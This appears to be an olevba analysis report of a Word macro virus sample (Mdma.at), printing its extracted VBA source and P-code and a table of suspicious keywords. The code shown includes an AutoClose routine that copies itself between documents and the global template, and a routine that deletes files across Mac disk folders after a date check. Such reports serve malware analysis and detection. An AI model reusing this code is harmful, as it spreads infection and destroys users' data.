olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Mdma.at
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Mdma.at - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.Mdma.at - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    install
    End Sub

Private Sub install()
Dim total
Dim installed
Dim i
    total = WordBasic.CountMacros(0)
    installed = 0
    If total > 0 Then
        For i = 1 To total
            If WordBasic.[MacroName$](i, 0) = "AutoClose" Then
                installed = 1
            End If
        Next
    End If
    If installed = 0 Then
        WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoClose", "Global:AutoClose"
    Else
        total = WordBasic.CountMacros(1)
        installed = 0
        If total > 0 Then
            For i = 1 To total
                If WordBasic.[MacroName$](i, 1) = "AutoClose" Then
                    installed = 1
                End If
            Next
        End If
        If installed = 0 Then
            WordBasic.FileSaveAs Format:=1
            WordBasic.MacroCopy "Global:AutoClose", WordBasic.[WindowName$]() + ":AutoClose"
        End If
    End If
End Sub

Private Sub infect()
Dim count_
Dim i
    If (WordBasic.[GetSystemInfo$](21) = "Windows" Or WordBasic.[GetSystemInfo$](21) = "Windows NT") Then
        Open "c:\shmk." For Append As 1
        If LOF(1) <> 4 And WordBasic.Day(WordBasic.Now()) > 20 Then
            
        End If
        Close 1
    End If

    If Mid(WordBasic.[AppInfo$](21), 1, 3) = "Mac" And WordBasic.Day(WordBasic.Now()) > 4 Then
        WordBasic.ChDir "HD:"
        count_ = WordBasic.CountDirectories()
        For i = 1 To count_
            WordBasic.ChDir "HD" + WordBasic.[GetDirectory$](1)
            WordBasic.Kill WordBasic.[MacID$]("****")
            WordBasic.ChDir "HD:"
        Next
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: ./Virus.MSWord.Mdma.at - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Mdma.at
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoClose - 3303 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	ArgsCall install 0x0000 
' Line #3:
' 	EndSub 
' Line #4:
' Line #5:
' 	FuncDefn (Private Sub install())
' Line #6:
' 	Dim 
' 	VarDefn total
' Line #7:
' 	Dim 
' 	VarDefn installed
' Line #8:
' 	Dim 
' 	VarDefn i
' Line #9:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	St total 
' Line #10:
' 	LitDI2 0x0000 
' 	St installed 
' Line #11:
' 	Ld total 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #12:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld total 
' 	For 
' Line #13:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0009 "AutoClose"
' 	Eq 
' 	IfBlock 
' Line #14:
' 	LitDI2 0x0001 
' 	St installed 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	StartForVariable 
' 	Next 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	Ld installed 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #19:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #20:
' 	ElseBlock 
' Line #21:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	St total 
' Line #22:
' 	LitDI2 0x0000 
' 	St installed 
' Line #23:
' 	Ld total 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld total 
' 	For 
' Line #25:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0009 "AutoClose"
' 	Eq 
' 	IfBlock 
' Line #26:
' 	LitDI2 0x0001 
' 	St installed 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Next 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	Ld installed 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #31:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #32:
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	EndSub 
' Line #36:
' Line #37:
' 	FuncDefn (Private Sub infect())
' Line #38:
' 	Dim 
' 	VarDefn count_
' Line #39:
' 	Dim 
' 	VarDefn i
' Line #40:
' 	LitDI2 0x0015 
' 	Ld WordBasic 
' 	ArgsMemLd [GetSystemInfo$] 0x0001 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	LitDI2 0x0015 
' 	Ld WordBasic 
' 	ArgsMemLd [GetSystemInfo$] 0x0001 
' 	LitStr 0x000A "Windows NT"
' 	Eq 
' 	Or 
' 	Paren 
' 	IfBlock 
' Line #41:
' 	LitStr 0x0008 "c:\shmk."
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Append)
' Line #42:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0004 
' 	Ne 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0014 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #43:
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #46:
' 	EndIfBlock 
' Line #47:
' Line #48:
' 	LitDI2 0x0015 
' 	Ld WordBasic 
' 	ArgsMemLd [AppInfo$] 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0003 "Mac"
' 	Eq 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x0004 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #49:
' 	LitStr 0x0003 "HD:"
' 	Ld WordBasic 
' 	ArgsMemCall ChDir 0x0001 
' Line #50:
' 	Ld WordBasic 
' 	ArgsMemLd CountDirectories 0x0000 
' 	St count_ 
' Line #51:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld count_ 
' 	For 
' Line #52:
' 	LitStr 0x0002 "HD"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [GetDirectory$] 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall ChDir 0x0001 
' Line #53:
' 	LitStr 0x0004 "****"
' 	Ld WordBasic 
' 	ArgsMemLd [MacID$] 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #54:
' 	LitStr 0x0003 "HD:"
' 	Ld WordBasic 
' 	ArgsMemCall ChDir 0x0001 
' Line #55:
' 	StartForVariable 
' 	Next 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

